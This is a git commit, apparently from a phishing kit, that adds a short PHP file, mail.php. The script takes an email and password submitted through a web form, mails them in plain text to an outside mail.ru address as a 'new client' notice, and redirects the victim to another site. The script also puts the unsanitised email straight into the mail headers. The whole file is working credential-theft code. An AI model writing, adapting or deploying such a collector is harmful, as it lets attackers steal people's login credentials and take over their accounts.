aee225dc02919df605e2301ed3f7f4b09bf7511b
DeepDunge0n <89940561+DeepDunge0n@users.noreply.github.com>
2024-03-07 20:33:04 +0300

    Add files via upload

---
+++ mail.php
@@ -0,0 +1,21 @@
+<?php
+
+    $from = trim($_POST['email']);
+    $password = $_POST['password'];
+
+    $message = "Новый клиент!\nПочта: $from\nПароль: $password";
+    $message = htmlspecialchars($message);
+    $message = urldecode($message);
+    $message = trim($message);
+
+
+    $to = "mr_gem228@mail.ru";
+    $subject = "Новый клиент";
+    $headers = "From: $from\r\nReply-to: $from\r\nContent-type:text/plain; charset=utf-8\r\n";
+
+    if(mail($to, $subject, $message, $headers)){
+    header('Location: http://sitedan/');
+    exit();
+    }
+
+?>
